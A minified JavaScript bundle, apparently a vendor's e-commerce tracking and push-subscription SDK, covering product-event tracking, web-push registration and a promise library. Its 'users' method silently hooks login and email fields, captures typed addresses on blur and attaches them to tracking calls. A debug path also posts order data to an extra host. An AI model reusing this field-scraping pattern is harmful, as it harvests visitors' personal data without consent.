                    switch (u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "perform", this).call(this, e),
                    e[0]) {
                    case "subscribe":
                        this.popupShow(e[1]);
                        break;
                    case "triggers":
                    case "digests":
                    case "mailings":
                        this.subscribe(null, null, e[0], e[1]);
                        break;
                    case "enabled":
                        "function" == typeof e[1] && e[1](this.enabled())
                    }
                }
            }, {
                key: "users",
                value: function() {
                    var e = this
                      , t = setInterval(function() {
                        var r = ["login", "mail", "user", "name"]
                          , i = document.getElementsByTagName("input");
                        [].forEach.call(i, function(i) {
                            var n = i.attributes;
                            n.length > 0 && [].forEach.call(n, function(n) {
                                var o = n.value;
                                return r.some(function(r) {
                                    return o.toLowerCase().indexOf(r) + 1 && (i.onblur = function() {
                                        var r = i.value.trim();
                                        if (/^([\w-]+(?:.[\w-]+)*)@((?:[\w-]+.)*\w[\w-]{0,66}).([a-z]{2,6}(?:.[a-z]{2})?)$/i.test(r)) {
                                            var n = /^.*rees46\.com.*$/i;
                                            (!n.test(r) || n.test(location.host) || e.core.logger.debugLevel) && (clearInterval(t),
                                            d.default.set(e.core, {
                                                email: r
                                            }))
                                        }
                                    }
                                    )
                                })
                            })
                        })
                    }, 100)
                }
            }]),
            t
        }(g.default);
        t.default = b
    }
    , function(e, t, r) {
        "use strict";
        function i(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var n = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , o = function() {
            function e(t) {
                i(this, e),
                this.queue = t || []
            }
            return n(e, [{
                key: "length",
                get: function() {
                    return this.queue.length
                }
            }]),
            n(e, [{
                key: "push",
                value: function(e) {
                    this.queue.push(e)
                }
            }, {
                key: "getInit",
                value: function() {
                    var e = this.findByName("init");
                    if (e)
                        return e;
                    throw Error("Init command not found in queue")
                }
            }, {
                key: "findByName",
                value: function(e) {
                    for (var t = 0; t < this.queue.length; t++)
                        if (this.queue[t][0] === e)
                            return this.queue.splice(t, 1)[0]
                }
            }, {
                key: "next",
                value: function() {
                    return this.queue.length > 0 ? this.queue.splice(0, 1)[0] : null
                }
            }]),
            e
        }();
        t.default = o
    }
    , function(e, t, r) {
        "use strict";
        function i(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var n = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , o = function() {
            function e(t) {
                i(this, e),
                this.core = t
            }
            return n(e, [{
                key: "perform",
                value: function(e) {
                    var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
                      , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : null;
                    switch (e) {
                    case "css":
                        this.addStyleToPage("reputation_css");
                        break;
                    case "get":
                    case "product":
                    case "widget":
                        this[e](t, r)
                    }
                }
            }, {
                key: "addStyleToPage",
                value: function(e) {
                    this.core.logger.debug("Добавление стиля окна подписки на страницу.", this);
                    var t = document.createElement("link");
                    t.setAttribute("rel", "stylesheet"),
                    t.setAttribute("type", "text/css"),
                    t.setAttribute("href", "//" + this.core.api.getMasterHost() + "/" + e + "/" + this.core.shop.token + ".css"),
                    document.getElementsByTagName("head")[0].appendChild(t)
                }
            }, {
                key: "get",
                value: function(e, t) {
                    var r = {
                        shop_id: this.core.shop.token
                    };
                    e.count && (r.count = e.count),
                    e.offset && (r.offset = e.offset),
                    this.core.ajax.sendGet(this.core.api.getAPIUrl("/reputation/shop"), r).then(t)
                }
            }, {
                key: "product",
                value: function(e, t) {
                    if (!e.product_id)
                        throw Error("Reputation: product_id not set");
                    var r = {
                        shop_id: this.core.shop.token,
                        product_id: e.product_id
                    };
                    e.count && (r.count = e.count),
                    e.offset && (r.offset = e.offset),
                    this.core.ajax.sendGet(this.core.api.getAPIUrl("/reputation/product"), r).then(t)
                }
            }, {
                key: "widget",
                value: function(e, t) {
                    if (!e.style || -1 == ["white", "green", "grey"].indexOf(e.style))
                        throw Error("Reputation: style is incorrect, please set in white, green, grey");
                    var r = {
                        shop_id: this.core.shop.token,
                        style: e.style
                    };
                    this.core.ajax.sendGet(this.core.api.getAPIUrl("/reputation/widget"), r).then(t)
                }
            }]),
            e
        }();
        t.default = o
    }
    , function(e, t, r) {
        "use strict";
        function i(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }
        function n(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var o = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
            return typeof e
        }
        : function(e) {
            return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
        }
          , s = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , a = r(3)
          , u = i(a)
          , c = r(0)
          , l = i(c)
          , h = r(8)
          , f = i(h)
          , p = function() {
            function e(t, r, i) {
                var o = this;
                if (n(this, e),
                this.core = t,
                !i)
                    throw Error("Track: empty data for track event");
                this.queryParams = {
                    event: r,
                    shop_id: this.core.shop.token,
                    ssid: this.core.user.ssid
                };
                var s = u.default.get("rr-VisitorSegment_Rec")
                  , a = u.default.get("DS_SM_rrSegmentRecommendedABC");
                switch (s && (this.queryParams.segment1 = s),
                a && (this.queryParams.segment2 = a),
                r) {
                case "view":
                    this.buildParams(i);
                    break;
                case "cart":
                    i instanceof Array ? i.forEach(function(e, t) {
                        if (!e.id)
                            throw Error("Tracking: product ID is not defined: " + JSON.stringify(e) + ".");
                        o.buildParams(e, t)
                    }) : (i.recommended_by && (this.queryParams.recommended_by = i.recommended_by),
                    this.buildParams(i));
                    break;
                case "remove_from_cart":
                    if ("string" != typeof i && "number" != typeof i)
                        throw Error("Track: Incorrect syntax of the product argument: " + i + ". Number or string with product ID supported only for 'remove_from_cart' event. Check manual.");
                    this.queryParams["item_id[0]"] = i;
                    break;
                case "purchase":
                    if (i.order && (this.queryParams.order_id = i.order),
                    i.order_price && (this.queryParams.order_price = i.order_price),
                    !i.products || 0 === i.products.length)
                        throw Error("Track: product list for purchase tracking is empty");
                    i.products.forEach(function(e, t) {
                        if (!e.id)
                            throw Error("Tracking: product ID is not defined: " + JSON.stringify(e) + ".");
                        o.queryParams["item_id[" + t + "]"] = e.id,
                        e.amount && (o.queryParams["amount[" + t + "]"] = e.amount),
                        e.price && (o.queryParams["price[" + t + "]"] = e.price)
                    });
                    break;
                default:
                    throw Error("Track: Undefined event " + r)
                }
            }
            return s(e, [{
                key: "buildParams",
                value: function(e) {
                    var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                    if ("object" === (void 0 === e ? "undefined" : o(e))) {
                        if (!e.id)
                            throw Error("Track: Item ID not set");
                        this.queryParams["item_id[" + t + "]"] = e.id,
                        this.queryParams["is_available[" + t + "]"] = void 0 === e.stock || e.stock ? 1 : 0,
                        e.categories && (this.queryParams["categories[" + t + "]"] = e.categories.join(",")),
                        e.price && (this.queryParams["price[" + t + "]"] = e.price),
                        e.url && (this.queryParams["url[" + t + "]"] = e.url),
                        e.image && (this.queryParams["image_url[" + t + "]"] = e.image),
                        e.amount && (this.queryParams["amount[" + t + "]"] = e.amount),
                        e.name && (this.queryParams["name[" + t + "]"] = e.name)
                    } else {
                        if ("string" != typeof e && "number" != typeof e)
                            throw Error("Track: Incorrect syntax of the product argument: " + e + ". Number, string or extended object supported only. Check manual.");
                        this.queryParams["item_id[" + t + "]"] = e,
                        this.queryParams["is_available[" + t + "]"] = 1
                    }
                }
            }, {
                key: "send",
                value: function(e, t) {
                    if (e && (this.queryParams.recommended_by = e,
                    !f.default.isTypeValid(e)))
                        throw Error('Push: invalid type "' + e + '"');
                    if (t && (this.queryParams.source = JSON.stringify(t)),
                    this.core.user.id && (this.queryParams.user_id = this.core.user.id),
                    this.core.user.email && (this.queryParams.user_email = this.core.user.email),
                    this.core.user.location && (this.queryParams.user_location = this.core.user.location),
                    t)
                        switch (t.from) {
                        case "trigger_mail":
                        case "digest_mail":
                            this.queryParams[t.from + "_code"] = t.code;
                            break;
                        case "r46_returner":
                            this.queryParams.returner_code = t.code;
                            break;
                        case "web_push_trigger":
                        case "web_push_digest":
                            this.queryParams[t.from + "_code"] = t.code
                        }
                    return this.core.shop.debug && "purchase" === this.queryParams.event && (this.core.ajax.send("get", "https://hackday.ru/track_order", {
                        order_id: this.queryParams.order_id,
                        shop_id: this.core.shop.token,
                        ssid: this.core.user.ssid
                    }),
                    this.core.ajax.send("get", this.core.api.getAPIUrl("/track_order"), {
                        order_id: this.queryParams.order_id,
                        shop_id: this.core.shop.token,
                        ssid: this.core.user.ssid
                    })),
                    this.core.ajax.sendWithRetry("post", this.core.api.getAPIUrl("/push"), this.queryParams).then(function(e) {
                        "string" == typeof e.url && e.url && l.default.markDMP([e.url]),
                        "object" === o(e.url) && e.url.length && l.default.markDMP(e.url)
                    })
                }
            }]),
            e
        }();
        t.default = p
    }
    , function(e, t, r) {
        "use strict";
        function i(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var n = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , o = r(0)
          , s = function(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }(o)
          , a = function() {
            function e(t) {
                i(this, e),
                this.core = t
            }
            return n(e, [{
                key: "productAvailable",
                value: function(e) {
                    this.makeRequest(e, "/subscriptions/subscribe_for_product_available")
                }
            }, {
                key: "productPriceDecrease",
                value: function(e) {
                    if (!e.price || isNaN(parseFloat(e.price)) || parseFloat(e.price) < 1)
                        throw Error("Incorrect price field");
                    this.makeRequest(e, "/subscriptions/subscribe_for_product_price")
                }
            }, {
                key: "makeRequest",
                value: function(e, t) {
                    var r = this
                      , i = {
                        shop_id: this.core.shop.token,
                        ssid: this.core.user.ssid,
                        item_id: e.item
                    };
                    "string" == typeof e.email && s.default.validEmail(e.email) && (i.email = e.email),
                    e.price && (i.price = e.price),
                    this.core.emailSubscription.push(["subscribed", function(n) {
                        switch (i.email || e.popup || n || !r.core.webPushSubscription.enabled() || !r.core.webPushSubscription.supported() ? i.type = e.popup : i.type = "webpush",
                        i.type) {
                        case "webpush":
                            r.core.webPushSubscription.push(["subscribe", function() {
                                r.core.ajax.sendWithRetry("post", r.core.api.getAPIUrl(t), i)
                            }
                            ]);
                            break;
                        default:
                            i.type = "email",
                            n || i.email || r.core.shop.has_email ? r.core.ajax.sendWithRetry("post", r.core.api.getAPIUrl(t), i) : r.core.emailSubscription.popupShow(function(e, n, o) {
                                i.email = o,
                                r.core.ajax.sendWithRetry("post", r.core.api.getAPIUrl(t), i).then(e)
                            })
                        }
                    }
                    ])
                }
            }, {
                key: "fetch",
                value: function(e, t) {
                    if (void 0 === t.item)
                        throw Error("Incorrect item field");
                    switch (e) {
                    case "product_available":
                        return this.productAvailable(t);
                    case "product_price_decrease":
                        return this.productPriceDecrease(t)
                    }
                }
            }]),
            e
        }();
        t.default = a
    }
    , function(e, t, r) {
        "use strict";
        function i(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }
        function n(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        }
        function o(e, t) {
            if (!e)
                throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }
        function s(e, t) {
            if ("function" != typeof t && null !== t)
                throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }),
            t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var a = function() {
            function e(e, t) {
                for (var r = 0; r < t.length; r++) {
                    var i = t[r];
                    i.enumerable = i.enumerable || !1,
                    i.configurable = !0,
                    "value"in i && (i.writable = !0),
                    Object.defineProperty(e, i.key, i)
                }
            }
            return function(t, r, i) {
                return r && e(t.prototype, r),
                i && e(t, i),
                t
            }
        }()
          , u = function e(t, r, i) {
            null === t && (t = Function.prototype);
            var n = Object.getOwnPropertyDescriptor(t, r);
            if (void 0 === n) {
                var o = Object.getPrototypeOf(t);
                return null === o ? void 0 : e(o, r, i)
            }
            if ("value"in n)
                return n.value;
            var s = n.get;
            if (void 0 !== s)
                return s.call(i)
        }
          , c = r(0)
          , l = i(c)
          , h = r(6)
          , f = i(h)
          , p = r(9)
          , d = i(p)
          , m = function(e) {
            function t(e) {
                n(this, t);
                var r = o(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, "rees46-web-push-subscribe-button", "rees46_webpush", 3e4));
                return r.available = !1,
                r.iframe = !1,
                r.registration = null,
                r.popupWindow = null,
                r
            }
            return s(t, e),
            a(t, [{
                key: "init",
                value: function() {
                    var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                    u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "init", this).call(this, e),
                    this.settings && "declined" !== this.status ? this.enabledFrame() ? (this.addStyleToPage("webpush_popup_css"),
                    this.registerFrame()) : this.enabled() && this.supported() ? (this.logger.debug("включен", this),
                    this.available = !0,
                    this.addStyleToPage("webpush_popup_css"),
                    this.registerServiceWorker()) : (this.initialized = !0,
                    this.removeSubscribeButtons()) : (this.removeSubscribeButtons(),
                    this.logger.debug("не активен", this))
                }
            }, {
                key: "onInitialize",
                value: function() {
                    this.activateSubscribeButtons(this.popup.bind(this)),
                    this.performQueue(),
                    this.settings.manual_mode || this.schedulePopup(this.popup.bind(this))
                }
            }, {
                key: "enabled",
                value: function() {
                    return this.settings && this.settings.enabled && ("localhost" === document.location.hostname || "https:" === document.location.protocol) && !this.core.browserIsPrivateMode
                }
            }, {
                key: "enabledFrame",
                value: function() {
                    return this.settings && this.settings.enabled && !this.core.browserIsPrivateMode && this.settings.subdomain
                }
            }, {
                key: "registerFrame",
                value: function() {
                    this.logger.debug("Добавление iframe подписки на страницу.", this),
                    this.iframe = document.createElement("iframe"),
                    this.iframe.setAttribute("frameborder", "0"),
                    this.iframe.setAttribute("width", "0"),
                    this.iframe.setAttribute("height", "0"),
                    this.iframe.setAttribute("src", this.core.api.getWebPushHost(this.settings.subdomain) + "/?shop_id=" + this.core.shop.token),
                    document.getElementsByTagName("body")[0].appendChild(this.iframe),
                    window.addEventListener("message", this.onIframeMessage.bind(this)),
                    this.iframe.onload = function() {
                        this.sendIframeMessage({
                            type: "initialize",
                            options: this.settings,
                            safari_url: this.core.api.getAPIUrl("/web_push_subscriptions/safari_webpush?shop_id=" + this.core.shop.token + "&type=")
                        })
                    }
                    .bind(this)
                }
            }, {
                key: "onIframeMessage",
                value: function(e) {
                    if (e.origin === this.core.api.getWebPushHost(this.settings.subdomain))
                        switch (e.data.type) {
                        case "load":
                            this.nWindow.postMessage({
                                type: "initialize",
                                options: this.settings,
                                popup: !0,
                                safari_url: this.core.api.getAPIUrl("/web_push_subscriptions/safari_webpush?shop_id=" + this.core.shop.token + "&type=")
                            }, this.core.api.getWebPushHost(this.settings.subdomain));
                            break;
                        case "initialized":
                            this.onInitialize();
                            break;
                        case "subscribed":
                            this.disableSchedulePopup(),
                            this.removeSubscribeButtons(),
                            this.sendRegistrationToken(e.data.token);
                            break;
                        case "unsubscribed":
                            this.unsubscribed(),
                            this.popupWindow && (this.popupWindow.close(),
                            this.popupWindow = null);
                            break;
                        case "granted":
                            this.popupWindow.submitSuccess();
                            break;
                        case "popup":
                            this.popupWindow.result.onClose = null,
                            this.popupWindow.submitSuccess(),
                            this.openSubscribePopup();
                            break;
                        case "error":
                            console.error(e.data.e);
                            break;
                        case "close":
                            this.popupWindow && (this.popupWindow.close(),
                            this.popupWindow = null)
                        }
                }
            }, {
                key: "sendIframeMessage",
                value: function(e) {
                    this.iframe.contentWindow.postMessage(e, this.core.api.getWebPushHost(this.settings.subdomain))
                }
            }, {
                key: "openSubscribePopup",
                value: function() {
                    if (this.popupWindow.userAccepted) {
                        this.iframe.parentNode.removeChild(this.iframe);
                        var e = screen.width
                          , t = screen.height;
                        this.nWindow = window.open(this.core.api.getWebPushHost(this.settings.subdomain) + "/?shop_id=" + this.core.shop.token, "Subscription", "scrollbars=no, width=50, height=50, top=" + (t - 50) + ", left=" + (e - 50) + ", location=no, status=no, menubar=no, toolbar=no")
                    }
                }
            }, {
                key: "enabledSafari",
                value: function() {
                    return this.settings && this.settings.safari_enabled
                }
            }, {
                key: "supported",
                value: function() {
                    return -1 === navigator.userAgent.toLowerCase().indexOf("msie") && (t.supportedSafari() && this.enabledSafari() || t.supportedOpera() || t.supportedWebkit() ? "denied" !== Notification.permission || (this.logger.debug("The user has blocked notifications.", this),
                    !1) : (this.logger.debug("Notifications aren't supported.", this),
                    !1))
                }
            }, {
                key: "isRegistered",
                value: function() {
                    return this.initialized && this.registration
                }
            }, {
                key: "popup",
                value: function() {
                    if (!d.default.isPopupActive() && "accepted" !== this.status)
                        if (this.settings && this.settings.enabled)
                            if (this.logger.debug("показ окна сбора.", this),
                            l.default.isMobile() || this.settings.manual_mode)
                                this.subscribe();
                            else {
                                var e = {
                                    onSuccess: this.subscribe.bind(this)
                                };
                                this.iframe ? e.onClose = this.openSubscribePopup.bind(this) : e.onError = this.unsubscribe.bind(this),
                                this.popupWindow = new f.default("rees46-web-push-popup",e,this.settings,this.core.shop),
                                this.currentUserInfo.showed = !0,
                                this.saveUserInfo(),
                                this.core.ajax.sendWithRetry("post", this.core.api.getAPIUrl("/web_push_subscriptions/showed"), {
                                    shop_id: this.core.shop.token,
                                    ssid: this.core.user.ssid
                                })
                            }
                        else
                            this.logger.debug("попытка показать окно при выключенной функции сбора.", this)
                }
            }, {
                key: "registerServiceWorker",
                value: function() {
                    var e = this;
                    if (t.supportedSafari()) {
                        var r = window.safari.pushNotification.permission(this.settings.safari_id);
                        this.initialized = !0,
                        this.registration = !0,
                        "granted" === r.permission && (this.subscription = !0),
                        "denied" !== r.permission && this.removeSubscribeButtons()
                    } else {
                        var i = document.createElement("link")
                          , n = document.getElementsByTagName("head")[0];
                        i.setAttribute("rel", "manifest"),
                        i.setAttribute("href", "/manifest.json"),
                        n && document.getElementsByTagName("head")[0].appendChild(i),
                        navigator.serviceWorker.register(this.settings.service_worker || "/push_sw.js").then(function(t) {
                            e.logger.debug("Service Worker is ready", e),
                            e.initialized = !0,
                            e.registration = t,
                            e.onInitialize()
                        }).catch(function(t) {
                            e.logger.error("Service Worker error: " + t)
                        }),
                        navigator.serviceWorker.ready.then(function(e) {
                            e.pushManager.getSubscription().then(function(e) {
                                e && (this.subscription = e,
                                this.disableSchedulePopup(),
                                this.removeSubscribeButtons(),
                                "accepted" !== this.status && this.subscribed(e))
                            }
                            .bind(this))
                        }
                        .bind(this))
                    }
                }
            }, {
                key: "checkSafariRemotePermission",
                value: function(e, t, r) {
                    "default" === e.permission ? this.safariRequestPermission(t, r) : "denied" === e.permission ? (this.logger.debug("The user has blocked notifications.", this),
                    this.unsubscribed(),
                    "function" == typeof r && r()) : "granted" === e.permission && (this.initialized = !0,
                    this.subscription = !0,
                    this.sendRegistrationToken(JSON.stringify({
                        browser: "safari",
                        token: e.deviceToken
                    }), t))
                }
            }, {
                key: "safariRequestPermission",
                value: function(e, t) {
                    var r = this;
                    window.safari.pushNotification.requestPermission(this.core.api.getAPIUrl("/web_push_subscriptions/safari_webpush?shop_id=" + this.core.shop.token + "&type="), this.settings.safari_id, {}, function(i) {
                        r.checkSafariRemotePermission(i, e, t)
                    })
                }
            }, {
                key: "subscribe",
                value: function(e, r) {
                    var i = this;
                    this.iframe ? this.sendIframeMessage({
                        type: "subscribe"
                    }) : this.isRegistered() ? this.isSubscribed() ? t.supportedSafari() ? this.checkSafariRemotePermission(window.safari.pushNotification.permission(this.settings.safari_id), e, r) : this.subscribed(this.subscription, e) : t.supportedSafari() ? this.safariRequestPermission(e, r) : new Promise(function(e, t) {
                        return "denied" === Notification.permission ? (i.unsubscribed(),
                        t(Error("Push messages are blocked."))) : "granted" === Notification.permission ? e() : void ("default" === Notification.permission && Notification.requestPermission(function(r) {
                            if ("granted" !== r)
                                return "denied" === r && i.unsubscribed(),
                                t(Error("Bad permission result"));
                            e()
                        }))
                    }
                    ).then(function() {
                        return i.registration.pushManager.subscribe({
                            userVisibleOnly: !0
                        }).then(function(t) {
                            i.subscribed(t, e)
                        }, function(e) {
                            i.logger.error(e, i),
                            i.unsubscribed(),
                            "function" == typeof r && r(e)
                        })
                    }).catch(r) : this.logger.error("Web push service is not registered")
                }
            }, {
                key: "isSubscribed",
                value: function() {
                    return this.subscription && "accepted" === this.status
                }
            }, {
                key: "subscribed",
                value: function(e, t) {
                    this.subscription = e,
                    "accepted" !== this.settings.status && this.sendRegistrationToken(JSON.stringify(this.subscription.toJSON()), t)
                }
            }, {
                key: "unsubscribe",
                value: function() {
                    var e = this;
                    this.subscription ? this.subscription.unsubscribe().then(function() {
                        e.logger.debug("Unsubscribed!", e),
                        e.subscription = null,
                        e.unsubscribed()
                    }).catch(function(t) {
                        e.logger.error("Error unsubscribed: " + t, e)
                    }) : this.unsubscribed()
                }
            }, {
                key: "unsubscribed",
                value: function() {
                    this.core.ajax.sendWithRetry("post", this.core.api.getAPIUrl("/web_push_subscriptions/decline"), {
                        shop_id: this.core.shop.token,
                        ssid: this.core.user.ssid
                    }),
                    this.logger.debug("пользователь отказался от подписки, данные успешно отправлены на сервер."),
                    this.removeSubscribeButtons()
                }
            }, {
                key: "sendRegistrationToken",
                value: function(e, t) {
                    var r = this;
                    this.logger.debug("token: " + e, this);
                    var i = {
                        shop_id: this.core.shop.token || "",
                        ssid: this.core.user.ssid || "",
                        token: e
                    };
                    this.core.ajax.sendWithRetry("post", this.core.api.getAPIUrl("/web_push_subscriptions"), i).then(function(e) {
                        r.logger.debug("пользователь подписался, данные успешно отправлены на сервер.", r),
                        r.removeSubscribeButtons(),
                        "function" == typeof t && t(e)
                    })
                }
            }, {
                key: "perform",
                value: function(e) {
                    switch (u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "perform", this).call(this, e),
                    e[0]) {
                    case "subscribe":
                        this.subscribe(e[1], e[2]);
                        break;
                    case "supported":
                        "function" == typeof e[1] && e[1](this.supported());
                        break;
                    case "enabled":
                        "function" == typeof e[1] && e[1](this.enabled())
                    }
                }
            }], [{
                key: "supportedWebkit",
                value: function() {
                    return "serviceWorker"in navigator && "showNotification"in ServiceWorkerRegistration.prototype && "PushManager"in window
                }
            }, {
                key: "supportedSafari",
                value: function() {
                    return "safari"in window && "pushNotification"in window.safari
                }
            }, {
                key: "supportedOpera",
                value: function() {
                    return !(window.navigator.userAgent.indexOf("OPR") > -1 || window.navigator.userAgent.indexOf("Opera") > -1) && t.supportedWebkit()
                }
            }]),
            t
        }(d.default);
        t.default = m
    }
    , function(e, t, r) {
        "use strict";
        e.exports = r(25)
    }
    , function(e, t, r) {
        "use strict";
        var i = r(1);
        e.exports = i,
        i.prototype.done = function(e, t) {
            (arguments.length ? this.then.apply(this, arguments) : this).then(null, function(e) {
                setTimeout(function() {
                    throw e
                }, 0)
            })
        }
    }
    , function(e, t, r) {
        "use strict";
        function i(e) {
            var t = new n(n._61);
            return t._81 = 1,
            t._65 = e,
            t
        }
        var n = r(1);
        e.exports = n;
        var o = i(!0)
          , s = i(!1)
          , a = i(null)
          , u = i(void 0)
          , c = i(0)
          , l = i("");
        n.resolve = function(e) {
            if (e instanceof n)
                return e;
            if (null === e)
                return a;
            if (void 0 === e)
                return u;
            if (!0 === e)
                return o;
            if (!1 === e)
                return s;
            if (0 === e)
                return c;
            if ("" === e)
                return l;
            if ("object" == typeof e || "function" == typeof e)
                try {
                    var t = e.then;
                    if ("function" == typeof t)
                        return new n(t.bind(e))
                } catch (e) {
                    return new n(function(t, r) {
                        r(e)
                    }
                    )
                }
            return i(e)
        }
        ,
        n.all = function(e) {
            var t = Array.prototype.slice.call(e);
            return new n(function(e, r) {
                function i(s, a) {
                    if (a && ("object" == typeof a || "function" == typeof a)) {
                        if (a instanceof n && a.then === n.prototype.then) {
                            for (; 3 === a._81; )
                                a = a._65;
                            return 1 === a._81 ? i(s, a._65) : (2 === a._81 && r(a._65),
                            void a.then(function(e) {
                                i(s, e)
                            }, r))
                        }
                        var u = a.then;
                        if ("function" == typeof u) {
                            return void new n(u.bind(a)).then(function(e) {
                                i(s, e)
                            }, r)
                        }
                    }
                    t[s] = a,
                    0 == --o && e(t)
                }
                if (0 === t.length)
                    return e([]);
                for (var o = t.length, s = 0; s < t.length; s++)
                    i(s, t[s])
            }
            )
        }
        ,
        n.reject = function(e) {
            return new n(function(t, r) {
                r(e)
            }
            )
        }
        ,
        n.race = function(e) {
            return new n(function(t, r) {
                e.forEach(function(e) {
                    n.resolve(e).then(t, r)
                })
            }
            )
        }
        ,
        n.prototype.catch = function(e) {
            return this.then(null, e)
        }
    }
    , function(e, t, r) {
        "use strict";
        var i = r(1);
        e.exports = i,
        i.prototype.finally = function(e) {
            return this.then(function(t) {
                return i.resolve(e()).then(function() {
                    return t
                })
            }, function(t) {
                return i.resolve(e()).then(function() {
                    throw t
                })
            })
        }
    }
    , function(e, t, r) {
        "use strict";
        e.exports = r(1),
        r(22),
        r(24),
        r(23),
        r(26),
        r(27)
    }
    , function(e, t, r) {
        "use strict";
        function i(e, t) {
            for (var r = [], i = 0; i < t; i++)
                r.push("a" + i);
            var n = "return function (" + r.join(",") + ") {var self = this;return new Promise(function (rs, rj) {var res = fn.call(" + ["self"].concat(r).concat([a]).join(",") + ');if (res &&(typeof res === "object" || typeof res === "function") &&typeof res.then === "function") {rs(res);}});};';
            return Function(["Promise", "fn"], n)(o, e)
        }
        function n(e) {
            for (var t = Math.max(e.length - 1, 3), r = [], i = 0; i < t; i++)
                r.push("a" + i);
            var n = "return function (" + r.join(",") + ") {var self = this;var args;var argLength = arguments.length;if (arguments.length > " + t + ") {args = new Array(arguments.length + 1);for (var i = 0; i < arguments.length; i++) {args[i] = arguments[i];}}return new Promise(function (rs, rj) {var cb = " + a + ";var res;switch (argLength) {" + r.concat(["extra"]).map(function(e, t) {
                return "case " + t + ":res = fn.call(" + ["self"].concat(r.slice(0, t)).concat("cb").join(",") + ");break;"
            }).join("") + 'default:args[argLength] = cb;res = fn.apply(self, args);}if (res &&(typeof res === "object" || typeof res === "function") &&typeof res.then === "function") {rs(res);}});};';
            return Function(["Promise", "fn"], n)(o, e)
        }
        var o = r(1)
          , s = r(12);
        e.exports = o,
        o.denodeify = function(e, t) {
            return "number" == typeof t && t !== 1 / 0 ? i(e, t) : n(e)
        }
        ;
        var a = "function (err, res) {if (err) { rj(err); } else { rs(res); }}";
        o.nodeify = function(e) {
            return function() {
                var t = Array.prototype.slice.call(arguments)
                  , r = "function" == typeof t[t.length - 1] ? t.pop() : null
                  , i = this;
                try {
                    return e.apply(this, arguments).nodeify(r, i)
                } catch (e) {
                    if (null === r || void 0 === r)
                        return new o(function(t, r) {
                            r(e)
                        }
                        );
                    s(function() {
                        r.call(i, e)
                    })
                }
            }
        }
        ,
        o.prototype.nodeify = function(e, t) {
            if ("function" != typeof e)
                return this;
            this.then(function(r) {
                s(function() {
                    e.call(t, null, r)
                })
            }, function(r) {
                s(function() {
                    e.call(t, r)
                })
            })
        }
    }
    , function(e, t, r) {
        "use strict";
        var i = r(1);
        e.exports = i,
        i.enableSynchronous = function() {
            i.prototype.isPending = function() {
                return 0 == this.getState()
            }
            ,
            i.prototype.isFulfilled = function() {
                return 1 == this.getState()
            }
            ,
            i.prototype.isRejected = function() {
                return 2 == this.getState()
            }
            ,
            i.prototype.getValue = function() {
                if (3 === this._81)
                    return this._65.getValue();
                if (!this.isFulfilled())
                    throw Error("Cannot get a value of an unfulfilled promise.");
                return this._65
            }
            ,
            i.prototype.getReason = function() {
                if (3 === this._81)
                    return this._65.getReason();
                if (!this.isRejected())
                    throw Error("Cannot get a rejection reason of a non-rejected promise.");
                return this._65
            }
            ,
            i.prototype.getState = function() {
                return 3 === this._81 ? this._65.getState() : -1 === this._81 || -2 === this._81 ? 0 : this._81
            }
        }
        ,
        i.disableSynchronous = function() {
            i.prototype.isPending = void 0,
            i.prototype.isFulfilled = void 0,
            i.prototype.isRejected = void 0,
            i.prototype.getValue = void 0,
            i.prototype.getReason = void 0,
            i.prototype.getState = void 0
        }
    }
    , function(e, t, r) {
        "use strict";
        var i = function(e) {
            switch (typeof e) {
            case "string":
                return e;
            case "boolean":
